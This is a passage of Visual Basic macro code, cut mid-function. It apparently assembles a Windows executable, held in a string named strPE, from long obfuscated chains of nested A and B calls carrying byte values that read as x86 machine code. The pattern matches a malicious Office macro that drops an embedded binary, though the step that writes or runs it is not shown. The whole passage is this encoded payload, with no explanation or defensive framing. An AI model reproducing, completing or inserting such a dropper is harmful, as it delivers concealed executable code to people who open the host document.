    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 189), 193), 211), "B"), 197), 171), 139), 202), "<"), 186), 3), 3), 243), 243), 170), 198), 6), 207), 139), "U"), 239), 233), 157), "F"), 255), "[<."), 15), 133), 151), 0), 0), 0), 139), "E3"), 133), 192), 139), 194), 15), 133), 140), 208), 135), 0), 198), "F"), 255)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 243), "_{"), 139), 229), "]"), 195), 131), 251), 253), 15), 141), "P"), 26), 184), 210), "KF"), 137), "]"), 12), 138), 16), 136), 161), 255), "@"), 198), 6), 238), "F"), 131), 255), 164), "o"), 10), "O"), 128), 8), 136), 14), "F@O"), 241), "J"), 198), 6), "eF")
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(strPE, 133), 219), 189), 7), ":"), 174), "@"), 6), 226), 235), 3), 198), 6), "+"), 139), 195), 185), "do"), 0), 0), ":"), 247), "@F"), 133), 192), 139), 250), "~"), 5), 189), "0"), 136), 6), "F6"), 195), 185), 10), 0), 0), 0), 153), 163), "|"), 133), "R"), 139), 202)
    strPE = A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "~8"), 241), "gfffx"), 239), 193), 250), 2), 233), 18), 193), 232), 31), 244), 4), 128), 194), "0"), 136), 235), "F"), 128), 193), 144), 136), 14), 233), "Y"), 255), 255), 220), 149), 194), 198), "v"), 0), "8^"), 139), 157), "]"), 195), 144), "CU"), 139)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(strPE, 236), 139), "E"), 225), 139), "M"), 24), "p"), 152), 20), "P"), 139), "E"), 16), 193), 1), "Q"), 139), 152), 12), "R"), 139), 179), 8), " Q"), 135), 232), 14), 0), 0), 0), 131), 165), 28), "]"), 195), 144), 144), 144), 144), 144), 144), 246), 144), 144), "@"), 139), 236), 131)
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(strPE, 236), 20), 131), "}"), 16), "O|"), 7), 199), "H"), 16), "N"), 0), 0), 0), 221), "E"), 8), 220), 29), "0"), 189), "@"), 0), 139), "M"), 24), "S"), 139), "]"), 217), "V3"), 198), 233), 223), 224), 137), "u"), 181), 137), 26), 246), 196), "1"), 139), 251), "z"), 14), 221)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 241), 8), 128), 224), "j"), 214), 8), 199), 1), 1), 0), 0), 0), "c"), 170), 196), 139), "U"), 8), 141), "E"), 236), "XQR"), 255), 21), 24), 34), "@"), 0), 221), "]"), 8), 221), 216), "l"), 220), 29), "0"), 194), "@"), 184), 7), 144), 12), 223), "!"), 246), 245)
    strPE = B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "D{"), 31), 141), "s"), 252), 137), 243), "v"), 164), 221), "E"), 236), 220), 29), "&"), 130), 243), 0), 223), 222), 246), 196), "D{H#EWp"), 224), 16), 195), "@"), 0), 141), "E"), 236), "P"), 131), 236), 16), 221), 28), "$8"), 21), 24), 193), "@")
    strPE = B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(strPE, 0), 157), "]"), 244), 221), "E"), 4), 220), 5), 8), 195), "@"), 0), 131), 196), 12), "N"), 220), 138), 0), 195), "@"), 0), "F"), 218), "59"), 0), 139), "- "), 177), "0*"), 200), 136), 14), 139), "V"), 252), "A;"), 243), 137), "6"), 143), "w"), 168), 141), "C")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "P;"), 240), "s\"), 200), 230), 136), 23), "GB;"), 240), "r"), 246), 235), "z"), 221), 161), 178), 220), 29), "0)@"), 171), 229), 157), "%"), 0), "A"), 0), "/u>"), 221), "E"), 180), 216), 13), 248), 171), 246), 0), 221), "U"), 173), 217), 232), 204)
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 29), "("), 10), "@"), 0), 223), 224), 246), 182), 170), "z!"), 150), "U"), 8), 220), 13), 248), "2"), 21), 0), "N"), 221), 192), 220), 29), "("), 194), "@"), 0), 223), 224), 246), 196), 196), "y5"), 221), "]1"), 3), "u"), 252), 235), 2), 221), 216), 139), "E"), 16)
    strPE = B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(strPE, 141), "4"), 24), 139), "E"), 28), 133), 192), "u"), 3), 3), "u"), 203), 139), "M"), 20), 147), 243), "s"), 19), 139), "E"), 16), "_"), 247), 8), "w"), 13), 198), 3), 0), 139), 195), "^[a"), 132), "]"), 195), 139), 2), 252), ";"), 255), "Q"), 17), "wI"), 221), "f")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(strPE, 211), "_CP;"), 133), "s6"), 220), 13), 20), 208), "@"), 0), 141), "E"), 244), "P"), 131), "G"), 8), 221), 175), "Z"), 255), 21), "("), 181), 223), 174), 221), "E"), 244), 131), 196), 223), 232), 5), "5"), 0), 0), 139), 216), 187), 139), "] "), 4), "0"), 136)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "iG;"), 254), "v"), 201), 221), 216), 141), "SP,"), 242), "r"), 13), "_"), 198), "CO"), 0), 139), 195), "^["), 139), "_]"), 195), 138), 12), "G"), 198), 128), 194), 5), 128), 250), 252), 136), 22), "~("), 139), "U"), 28), 26), 243), 198), 223), "0")
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(strPE, "Y"), 5), "N"), 135), 6), 235), 20), 198), 6), "1"), 139), "9"), 147), 133), 210), 137), "9u"), 8), 14), 195), "v"), 3), 248), 0), 237), 147), 210), ">+"), 127), 219), 198), 0), 0), "_"), 139), 195), "^"), 217), 139), "\]"), 195), 144), 144), "{"), 144), 144), 144)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 227), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 139), "E"), 12), 139), "M"), 8), "v"), 145), "W"), 139), "}"), 20), 133), 192), 139), 247), "t"), 11), 151), "EJ"), 199), 0), "R"), 0), 0), 0), 235), 18), 139), "U"), 16), "3"), 192), 133), 201), 155), 156), 192)
    strPE = B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 133), 176), 137), "'t"), 2), 247), 217), "^"), 205), 204), 204), 204), 179), 10), "1"), 225), 193), 234), 3), "&"), 194), "N"), 237), 235), "*"), 169), 128), "+0V"), 14), 241), 202), 133), 210), "u"), 226), 135), "E"), 24), "+"), 254), "%8"), 141), 198), "_^[")
    strPE = B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "r"), 195), 144), 144), 175), 139), 236), 208), "E"), 12), 197), "M"), 16), "SP"), 211), 154), "W"), 139), "j"), 24), 133), "kw"), 13), 167), 5), 131), 251), 255), "]"), 4), 133), 201), "u!"), 133), 192), "U4|"), 8), 129), 251), 255), 137), 255), 127), "w*")
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 131), "C"), 255), "|%"), 127), 8), 129), 224), 0), 215), 0), 128), 30), 27), 223), 201), "u"), 27), "=E"), 28), 139), "U"), 206), " WRQS"), 232), "O"), 255), 168), 255), 148), 196), 209), "_C]"), 195), 133), 201), "t"), 11), 139), "M"), 20), 152)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 1), "w"), 166), 0), 0), 235), "#"), 214), 161), 127), 13), 9), 4), 133), 201), "s"), 7), 185), 1), 0), 19), 0), 235), 2), "3"), 201), 139), "U"), 20), 133), 201), 137), 10), "t"), 7), 184), 219), 131), 208), 222), 247), 216), "Vj"), 0), "j"), 10), "PS"), 232)
    strPE = A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 170), "6"), 0), 0), 139), 200), 139), 181), 138), 193), "a"), 10), 246), 234), "*"), 216), "O"), 128), 195), "9"), 139), 159), 136), 31), 139), 217), 11), 206), "u"), 219), 139), "E"), 24), 139), "M"), 28), "+"), 199), "^"), 137), 1), "]"), 199), "_[]"), 195), 144), 144), 144)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), "~"), 144), 144), 144), 144), 144), 144), 227), 139), 236), "Q7E"), 8), 243), 156), 139), 8), "Q"), 132), 21), 176), 193), 26), 0), 140), "uL"), 139), 216), 141), "U"), 8), 141), "E"), 12), 217), 139), 203), 174), "P3"), 225), 255), 0)
    strPE = B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 0), 251), "j"), 154), "Q"), 137), "]"), 252), 232), 157), 254), 255), 255), "H"), 141), "U"), 8), "#P"), 198), 190), 167), 141), "E[3"), 201), "P"), 138), "N"), 138), 1), "Q"), 232), 132), 254), 255), 255), "HfU"), 222), "RP"), 25), 0), "."), 141), "E]")
    strPE = B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "3"), 201), 202), 138), 197), 254), "j"), 24), "Q"), 248), "A"), 254), 255), 255), "H"), 34), "U"), 8), "RP"), 198), 130), "."), 141), "E"), 12), 160), "j"), 1), 193), 235), 24), "S"), 232), 191), 2), 255), "="), 139), "M"), 16), 204), 22), "P+"), 16), 137), "1^[")
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 139), 229), "]"), 195), 144), 6), "U"), 139), 236), 131), 236), 8), "S"), 140), 141), "E"), 252), "k"), 139), "}"), 12), "P"), 139), "EO"), 179), 206), "83"), 210), "Wf"), 139), "P"), 151), "Qj"), 1), "R"), 232), 26), 254), 255), 255), 139), 216), 228), "E"), 8), 131)
    strPE = B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 196), 20), "K"), 141), 183), 0), 254), 255), "X"), 198), 3), ":"), 139), "H"), 28), "vQV"), 232), 157), 226), 255), 177), 133), 192), "t"), 20), 139), "n"), 16), "K+"), 251), 139), 195), "b"), 3), "?>"), 195), "_^[D"), 229), 170), 195), "L"), 254), "s")
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(strPE, "9"), 255), "3"), 192), 242), 174), 247), 209), "I+"), 217), 178), 193), 139), 23), 193), 233), 2), 243), 165), 139), 239), 139), "E"), 12), 131), 225), 3), "+"), 195), "4"), 164), 139), "MU_E"), 137), 1), 139), 195), "["), 217), 229), "]"), 195), 154), 144), 144), 144)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "UL"), 236), 139), "M"), 16), 139), "E"), 8), 139), "U"), 12), "Q"), 139), 142), 141), "M"), 8), "RQj"), 1), "P"), 232), 148), 253), 255), 202), 130), 227), 20), 147), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), "Q"), 144), 144), "q"), 144), "yU"), 139)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(strPE, 173), 131), 236), "Z"), 138), "E"), 249), "SV"), 139), "u W"), 139), "}"), 24), 188), "fu"), 206), 139), "M"), 28), 141), "E"), 164), "P#Eb"), 141), "U"), 24), "Q"), 139), 156), 29), "RWPQ="), 192), 1), 207), 0), 235), 29), 139), 212)
    strPE = A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 28), 141), "UBR"), 141), 23), 24), "P"), 25), "E"), 16), 141), "W"), 1), "Q"), 139), "4"), 12), "RPQ"), 232), 1), 251), 255), 255), 139), 21), "t"), 193), 185), 204), 139), 216), 131), 158), 24), "T:"), 1), ")"), 21), "3"), 192), 169), 3), 1), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 138), 3), "P"), 255), 208), "h"), 193), "@"), 0), 131), 196), 8), 235), 21), 139), "5"), 137), 193), "@"), 0), "3"), 201), 138), 11), 139), 2), "f"), 139), 4), "H%"), 172), 1), 223), 0), 133), 192), "t"), 232), 139), 251), 131), 201), 13), 134), 192), 139), "U$"), 242)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(strPE, ")"), 139), "E"), 248), 139), 243), 247), 209), "x"), 139), 248), 137), 10), "A"), 230), 209), 193), 233), 2), "7"), 165), 139), 202), 131), "S"), 3), 243), 164), 139), "M"), 28), "_^["), 199), 1), 0), 0), 0), 0), 139), 229), "]"), 19), 229), "U"), 8), 128), "4"), 134)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "ul"), 139), "E"), 24), 133), "O"), 127), "O"), 190), "u "), 198), 6), "0FJ"), 255), "~"), 2), 198), 6), ".F"), 3), 192), 160), "("), 247), 216), 139), 200), 137), "L"), 28), 139), 209), 184), "000"), 241), 139), 254), 129), 233), 2), 243), "?"), 163)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 202), 131), 194), 183), 243), 147), 139), "E"), 24), 14), 202), "F"), 148), "^"), 235), 241), 3), 193), "@"), 185), "E"), 24), 235), "?HF"), 137), 167), 199), 138), "~"), 136), "NJC"), 233), 192), 127), 241), "H"), 133), 29), 247), "EF"), 127), 7), 139), "M"), 20)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(strPE, 133), "p"), 240), 153), "J"), 210), ".F"), 235), 27), 139), "u "), 138), 3), 136), 6), "FCu"), 255), 127), 7), 139), "E"), 20), 133), 192), 174), 4), 198), 6), ".F"), 139), 245), 24), 157), 22), 132), 201), "E"), 11), 136), 14), 138), "K"), 1), "FC")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(strPE, 132), 177), "u"), 245), 128), "@f"), 226), "h"), 136), 22), 1), "H"), 137), "EAtS"), 141), "C"), 28), 141), "U"), 254), 128), 141), "M"), 8), "RQj"), 0), "P"), 232), 250), 251), 255), 255), 139), "]"), 8), 131), 196), "u"), 139), 162), 28), 255), 219), 15)
    strPE = B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(strPE, 149), 194), "F"), 131), 249), 1), 141), "T"), 18), "+"), 136), "V"), 255), "u"), 225), 198), 217), "0F"), 235), 204), "A"), 201), "t&"), 138), 16), 206), 22), "F@Iu"), 168), 139), "E "), 139), "M["), 230), 213), "_"), 241), "1^["), 227), 229), "]")
    strPE = A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(strPE, 195), 198), 6), "+F"), 198), 6), "0F!"), 6), "0F"), 141), "E "), 127), "M$+"), 143), "_"), 137), "1l["), 139), 229), "O"), 195), 144), "-"), 212), 144), 144), 144), 144), 152), "h"), 30), "q"), 144), 144), 144), "U"), 139), 236), "UE"), 28)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 139), "M"), 202), 139), "U"), 168), "@"), 139), "E"), 16), 131), 144), "Q"), 248), "MFR"), 139), "U"), 8), 171), "QR"), 232), "n"), 249), 255), 255), 147), 196), 28), 31), 195), 187), 144), 28), 144), 144), 144), 144), 144), 144), "U"), 139), 236), "SVX"), 5), 235)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 12), 190), 1), 0), "9"), 0), 203), 207), 139), "E"), 20), 187), 188), 194), "@"), 0), 211), 240), 138), "M"), 16), "A"), 128), 249), "Xp"), 5), 187), 168), 194), "@"), 253), 139), 162), 6), 230), 206), 250), "#"), 202), 225), 12), 208), "<"), 8), 139), 207), 211), 234), 133)
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "KE"), 240), 139), "Mz"), 139), "U"), 24), 250), 200), "0^<"), 10), 191), "]"), 160), 144), 144), 144), 144), "U"), 139), 236), 139), ";"), 16), "SV"), 138), "E"), 20), "W"), 191), 1), 211), 0), 0), 139), "u"), 24), 187), 228), 194), 18), 0), 211), 231), "0")

    PE13 = strPE
End Function

Private Function PE14() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 22), 222), "s"), 129), 187), 208), 194), "{"), 0), 139), "U"), 12), 139), "E"), 8), "["), 210), "w"), 195), "r"), 4), 131), 248), 255), "0"), 27), 139), 251), 28), "$"), 139), "5"), 24), "R"), 139), "U"), 20), ")QP"), 232), "e"), 255), 158), 255), 22), 196), 23), "_^")
    strPE = A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "[]"), 195), 139), 200), "N#"), 207), 138), 12), 25), 136), 14), 139), "M"), 16), 232), 189), 141), 0), 0), "E"), 200), 11), 202), 170), 232), 139), "E"), 0), 139), "U"), 28), "+"), 198), "_"), 137), 2), 139), "T^[]"), 195), 144), 144), 144), "^"), 144), 144)
    strPE = A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(strPE, 194), 139), 236), 139), "M"), 16), 139), "E"), 8), "z'"), 12), "Q"), 139), 0), "R"), 218), "xj"), 138), "P"), 232), 22), 255), "@"), 255), 34), 196), 20), "]"), 195), "29"), 139), 197), 131), 236), 8), "V"), 139), "u"), 12), 133), 246), "u"), 8), 137), "u"), 248), 137)
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "u"), 252), "^"), 13), 139), "E "), 137), "E"), 22), 141), "D0"), 255), 137), "E"), 252), 139), "U"), 16), 222), "M"), 20), "Q"), 141), "E"), 248), "5Ph"), 208), 134), "@"), 0), 232), 180), 234), 255), 226), 133), 246), "t"), 6), ")M"), 248), 198), 1), 0), 131)
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "l"), 255), 132), 3), 141), "F"), 255), "f"), 137), 229), "]"), 195), 131), 224), 255), 195), 144), 144), 220), 144), 144), 144), 233), 144), 144), 144), 144), "]#"), 139), 236), 139), "E~= "), 237), 0), 0), "}a"), 139), "M"), 16), 139), "U"), 12), 141), "RP")
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 232), 184), 3), "%"), 0), 131), 196), 12), 181), 194), 12), 210), "="), 192), "A"), 1), "l}"), 27), "P"), 247), 145), 0), 0), "c"), 139), "M"), 12), "P"), 139), "E"), 16), "PQ"), 232), "c"), 0), 0), 0), 131), 196), 31), "]"), 194), 12), 0), "=09"), 10)
    strPE = B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 0), "}"), 25), 139), "U"), 16), "5E"), 12), "hN"), 249), "@"), 0), "R"), 196), 232), 208), 201), 0), "`"), 207), 196), 12), "]"), 194), 12), 245), "="), 128), 233), 242), "5e"), 25), 139), "M"), 16), 139), "U"), 12), "hT"), 249), "@"), 0), "QR"), 232), "#")
    strPE = B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 0), 0), "*Y"), 196), 12), "]"), 194), 12), 0), 139), "M"), 12), 168), 136), 3), 245), "EP"), 216), "E"), 16), "PQ"), 232), "Y"), 2), 0), 0), 131), 196), 143), "]"), 34), "%"), 28), 144), 144), "U"), 139), 236), 139), "E"), 12), 139), "M"), 16), "V"), 139), "u")
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(strPE, 8), "PQ"), 212), 249), 187), 29), 0), "m"), 139), 198), "^,"), 195), 144), 144), 144), 144), 144), 144), "U"), 139), 238), 139), "E"), 8), "=q"), 17), 12), 0), 15), 9), 195), 0), 0), 0), "k"), 255), "!"), 0), 23), 0), 5), 127), 177), 255), 255), 131), 248)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 199), 15), 140), "7"), 162), "d"), 0), 255), "$"), 133), 4), 137), "@"), 0), 184), 132), 0), "^"), 0), "]"), 136), 184), "`"), 0), "A"), 0), "&"), 195), 184), "@"), 0), "A"), 0), "]"), 195), 184), 16), 0), 167), 0), "]"), 195), 184), 228), 255), "@"), 0), 170), 195), 184)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 180), 0), "@"), 0), "]"), 195), 184), 136), 255), "@"), 0), "]"), 195), 184), "P"), 255), "@"), 0), "]"), 195), 184), " "), 255), "@"), 0), "]"), 195), 184), "2"), 254), "@"), 0), "]D"), 184), 180), 254), 202), 0), 219), 195), 184), 140), 254), "@"), 0), "]"), 195), 184), 139)
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 254), "@"), 0), "]"), 252), 184), "TR"), 133), 0), "d"), 222), 184), ","), 254), "@"), 0), "]"), 195), 184), 16), 254), "@"), 179), "]"), 195), 184), 244), 253), "@"), 0), "]"), 195), 184), 212), 253), 198), 0), "]6"), 184), 172), 253), "@"), 0), "]"), 195), 158), "l"), 253)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "@"), 0), 3), 195), 184), "<"), 253), "@"), 0), 24), "H"), 202), 231), 255), "@"), 0), 247), "W"), 184), 129), 191), "@"), 0), "]"), 195), 184), 192), 252), "@"), 0), "]"), 195), "*"), 142), 238), 254), 255), 131), 248), 22), "w~"), 255), "?"), 173), "l"), 137), "@"), 222), 184)
    strPE = B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "p8@"), 18), "]"), 253), 184), 149), 252), "@"), 0), "]"), 195), 184), 13), 242), "@"), 0), "]"), 195), 184), 161), 251), "@"), 0), "]"), 140), 0), 188), 251), "@"), 0), "0"), 195), 184), 152), 251), "@"), 0), "]"), 195), 184), "`"), 251), "@"), 22), "]"), 195), "K8")
    strPE = A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 251), "@"), 0), "]"), 195), 184), 0), 251), "@"), 0), 175), 195), 184), 236), 250), "@"), 0), "]"), 195), 184), 188), 250), 219), 0), "]"), 195), 184), 144), 250), "@"), 0), "]"), 195), 184), "d"), 250), "@"), 218), "]"), 195), 184), "4"), 250), "@"), 0), "]"), 195), 204), "{"), 249)
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "M"), 0), "]"), 195), 185), 180), 249), "@"), 0), "]"), 195), 7), 156), 249), 176), 0), "]"), 195), 9), "|"), 249), "["), 0), "]"), 195), 144), 204), 135), "@"), 0), 252), 136), "7"), 0), 226), "e@"), 0), 218), 135), "@"), 0), 225), 135), "@"), 0), "f"), 135), "@"), 0)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 239), 135), "@"), 0), 246), 135), "@"), 0), 253), 135), "@"), 0), 250), 136), "@"), 0), 11), 136), "|?"), 18), 136), "@"), 0), 1), "~@"), 0), 141), "[@"), 203), "'"), 136), "@"), 0), "."), 136), "@"), 0), 252), 136), "@"), 0), 252), 136), "@"), 0), "5"), 136)
